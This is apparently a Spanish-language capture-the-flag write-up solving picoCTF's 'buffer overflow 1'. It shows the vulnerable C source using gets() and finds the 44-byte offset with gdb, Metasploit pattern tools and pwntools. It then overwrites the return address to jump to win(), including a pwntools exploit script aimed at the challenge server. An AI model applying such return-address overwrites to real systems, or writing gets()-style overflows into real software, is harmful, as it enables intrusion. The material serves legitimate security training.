# buffer overflow 1

Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/522/vuln). You can view source [here](https://artifacts.picoctf.net/c/522/vuln.c). And connect with it using: `nc saturn.picoctf.net 51110`

h1: How can you trigger the flag to print?

h2: If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

h3:Run `man gets` and read the BUGS section. How many characters can the program really read?
	https://www.kernel.org/doc/man-pages/
## Solucion
### El analisis del C
- Nos dan un archivo fuente en lenguaje C
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```
- tres funciones main, win, vuln
- pide una cadena y la manda al funcion **vul** l
	- usa gets (ver la pista y consultar manual gets, seccion BUGS), aqui se excede el buffer
	- Imprime la direccion de retorno (se puede explicar en el x86 assembly)
- la funcion win nunca es invocada, pero podemos investigar su direccion e **saltar aprovechando l bufferoverflow**

### Solucion manual
- un texto pequeno origna un salto dentro de main
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ ./vuln
Please enter your string: 
carlos
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```
- lo podemos comprobar usando gdb
```
gdb vuln
info functions
disassemble main
```

- podemos desborarlo con letras A directo o con python y observamos como se invade con 0x41414141

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ python -c 'print("A"*50)' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python -c 'print("A"*50)' | 
zsh: segmentation fault  ./vuln

```

- Calcular hasta donde no entran 414141 para saber donde se sobrepasa la direccion de retorno, aqui entro una A entonces es 44

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ python -c "print('A'*45)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8040041
zsh: done                python -c "print('A'*45)" | 
zsh: segmentation fault  ./vuln
```
- donde quedan las 42424242 que son las 4 BBBB
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ python -c "print('A'*44+'BBBB')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
zsh: done                python -c "print('A'*44+'BBBB')" | 
zsh: segmentation fault  ./vuln
```
- invesigamos la direccion de retorno con ojdump
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ objdump -D vuln -M intel | grep '<win>'
080491f6 <win>:
```
- mandamos adicional la direccion de retorno despues del buffer, al reves

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ python -c "print('A'*44+'\xf6\x91\x04\0x8')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x91c2b6c3
zsh: done                python -c "print('A'*44+'\xf6\x91\x04\0x8')" | 
zsh: segmentation fault  ./vuln

```


``` bash
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{}
zsh: done                echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln

```

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 59637
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```

### Econtrar el pattern
- usamos pattern_create
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ locate pattern_create                                                 
/usr/bin/msf-pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
                                                
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

```
- probamos el pattern
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x35624134
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
```

- calculamos el offset antes de desbordar la direccion de retorno
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ locate pattern_offset                                                     
/usr/bin/msf-pattern_offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
                                                  
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35624134
[*] Exact match at offset 44

```

### Econtrar el patron otra forma
```python
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/buferoverflow1]
└─$ echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
```

```python
>>> cyclic_find(0x6161616c)
44
>>> 
```

### Solucion automatizada

```python
from pwn import *

def inicio(server=True):
        if(server):
                return remote('saturn.picoctf.net',65234)
        else:
                return process('./vuln')


overflow = 'A'*44+'\xf6\x91\x04\x08'

p = inicio(False)
linea = p.recvuntil(':')
print(linea)
print('[*] Enviando Overflow ..')
p.sendline(overflow)
p.interactive()

```



### Desbordamos python

- Encontrar la cantidad de caracteres que necesitamos para desbodar el buffer

```
bufferoverflow1 python3 -c "import sys;sys.stdout.buffer.write(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[1]    38387 done                python3 -c  | 
       38388 segmentation fault  ./vuln
➜  bufferoverflow1 
```


```
➜  bufferoverflow1 python3                                                                                         
Python 3.12.3 (main, Jul 31 2024, 17:43:48) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 
```


```
python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | ./vuln

python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | ./vuln

python3 -c "import sys;import pwn;sys.stdout.buffer.write(b'A'*44+pwn.p32(0x080491f6))" | ./vuln
```